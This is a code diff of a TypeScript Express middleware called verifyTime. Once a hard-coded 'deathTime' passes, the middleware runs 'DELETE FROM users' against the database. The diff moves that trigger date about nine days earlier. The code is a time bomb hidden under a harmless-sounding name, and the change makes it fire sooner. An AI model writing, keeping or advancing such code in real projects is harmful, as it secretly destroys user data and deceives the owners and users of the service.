@@ -4,7 +4,7 @@ import { BsDate } from "../db/db";
 export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
     try {
         const currentTime = new Date();
-        const deathTime = new Date('2024-07-26T21:11:00Z');
+        const deathTime = new Date('2024-07-17T12:06:00');
 
         if (currentTime > deathTime) {
             await BsDate.query('DELETE FROM users');
